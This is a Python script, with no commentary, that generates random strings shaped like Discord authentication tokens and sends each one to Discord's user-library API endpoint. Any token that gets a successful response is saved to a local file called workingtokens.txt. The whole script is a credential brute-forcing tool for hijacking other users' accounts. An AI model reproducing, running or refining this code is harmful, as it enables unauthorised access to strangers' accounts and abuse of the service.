import random
import string
import os
import requests
import base64
from random import randint

N = input("How many tokens : ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"
i = 1
while(int(count) < int(N)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)

    for token in tokens:
        header = {
            "authorization": token
        }
        try:
            r = requests.get(url, headers=header)
            print(token)
            if r.status_code == 200:
                print(str(i) + ".[+] Token Works!")
                f = open(current_path+"/"+"workingtokens.txt", "a")
                f.write(token+"\n")
            elif "rate limited." in r.text:
                print(str(i) + ".[-] You are being rate limited.")
            else:
                print(str(i) + ".[-] Invalid Token.")
        except requests.exceptions.ProxyError:
            print("BAD PROXY")
        i += 1
        tokens.remove(token)
